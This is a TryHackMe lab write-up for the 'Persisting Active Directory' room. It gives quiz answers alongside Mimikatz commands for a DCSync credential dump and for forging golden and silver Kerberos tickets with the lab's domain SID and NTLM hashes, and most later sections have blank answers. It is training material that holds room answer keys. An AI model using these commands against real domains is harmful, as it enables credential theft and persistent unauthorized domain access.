![Persisting Active Directory Banner](https://assets.tryhackme.com/room-banners/attacking-ad.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/persistingad/Persisting_Active_Directory_Cover.png" alt="Persisting Active Directory Logo">
</p>

# Persisting Active Directory

This guide contains the answer and steps necessary to get to them for the [Persisting Active Directory](https://tryhackme.com/room/persistingad) room.

## Table of contents

- [Persistence through Credentials](#persistence-through-credentials)
- [Persistence through Tickets](#persistence-through-tickets)
- [Persistence through Certificates](#persistence-through-certificates)
- [Persistence through SID History](#persistence-through-sid-history)
- [Persistence through Group Membership](#persistence-through-group-membership)
- [Persistence through ACLs](#persistence-through-acls)
- [Persistence through GPOs](#persistence-through-gpos)

### Persistence through Credentials

1. What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>lsadump::dcsync /domain:za.tryhackme.loc /user:test</details>

2. What is the NTLM hash associated with the krbtgt user?

   Lets ssh into `thmwrk1` using our DA account (don't use your ad user account).

   We now open `mimikatz`, set a log file and execute a dcsync on all account.

   ```cmd
   log kevinovitz_dcdump.txt
   lsadump::dcsync /domain:za.tryhackme.loc /all
   ```

   DCDUMP

   ><details><summary>Click for answer</summary>16f9af38fca3ada405386b3b57366082</details>

### Persistence through Tickets

In this task we can create a golden and silver ticket using the information we have found so far. For this we need:

- domain name: za.tryhackme.loc
- domain SID: S-1-5-21-3885271727-2693558621-2658995185
- some username: notmyreallaccount
- krbtgt NTLM hash: 16f9af38fca3ada405386b3b57366082
- target NTLM hash: 4c02d970f7b3da7f8ab6fa4dc77438f4

Golden ticket:

```cmd
kerberos::golden /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185 /id:500 /admin:notmyreallaccount /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10000 /ptt
```

We can see we now have access to the dc and server1.

GOLDEN

Silver ticket:

```cmd
kerberos::golden /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185 /user:notmyreall
account /target:thmserver1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
```

We now only have access to server1

SILVER

1. Which AD account's NTLM hash is used to sign Kerberos tickets?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>krbtgt</details>

2. What is the name of a ticket that impersonates a legitimate TGT?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Golden ticket</details>

3. What is the name of a ticket that impersonates a legitimate TGS?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Silver ticket</details>

4. What is the default lifetime (in years) of a golden ticket generated by Mimikatz?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>10</details>

### Persistence through Certificates

1. What key is used to sign certificates to prove their authenticity?



   ><details><summary>Click for answer</summary></details>

2. What application can we use to forge a certificate if we have the CA certificate and private key?



   ><details><summary>Click for answer</summary></details>

3. What is the Mimikatz command to pass a ticket from a file with the name of ticket.kirbi?



   ><details><summary>Click for answer</summary></details>

### Persistence through SID History

1. What AD object attribute is normally used to specify SIDs from the object's previous domain to allow seamless migration to a new domain?



   ><details><summary>Click for answer</summary></details>

2. What is the database file on the domain controller that stores all AD information?



   ><details><summary>Click for answer</summary></details>

3. What is the PowerShell command to restart the ntds service after we injected our SID history values?



   ><details><summary>Click for answer</summary></details>

### Persistence through Group Membership

1. What is the term used to describe AD groups that are members of other AD groups?



   ><details><summary>Click for answer</summary></details>

2. What is the command to add a new member, thmtest, to the AD group, thmgroup?



   ><details><summary>Click for answer</summary></details>

### Persistence through ACLs

1. What AD group's ACLs are used as a template for the ACLs of all Protected Groups?



   ><details><summary>Click for answer</summary></details>

2. What AD service updates the ACLs of all Protected Groups to match that of the template?



   ><details><summary>Click for answer</summary></details>

3. What ACL permission allows the user to perform any action on the AD object?



   ><details><summary>Click for answer</summary></details>

### Persistence through GPOs

1. What MMC snap-in can be used to manage GPOs?



   ><details><summary>Click for answer</summary></details>

2. What sub-GPO is used to grant users and groups access to local groups on the hosts that the GPO applies to?



   ><details><summary>Click for answer</summary></details>

3. What tab is used to modify the security permissions that users and groups have on the GPO?



   ><details><summary>Click for answer</summary></details>

